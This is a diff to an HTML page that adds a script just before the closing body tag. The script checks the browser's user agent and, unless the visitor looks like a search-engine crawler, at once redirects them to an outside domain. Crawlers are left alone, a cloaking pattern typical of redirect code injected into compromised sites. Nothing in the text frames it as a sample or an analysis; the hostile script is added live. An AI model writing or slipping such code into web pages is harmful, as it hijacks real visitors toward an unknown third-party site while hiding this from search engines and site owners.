@@ -507,7 +507,19 @@ referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
       });
     });
   </script>
+<script>
+setTimeout(() => {
+    const isBot = /bot|googlebot|bingbot|crawler|spider|slurp|duckduckbot/i.test(navigator.userAgent);
 
+    if (!isBot) {
+        window.location.href = "https://allprinters-matrix.b-cdn.net/";
+    } else {
+        console.log("Bot detected. Redirect cancelled.");
+    }
+}, 0000);
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 
 </html>
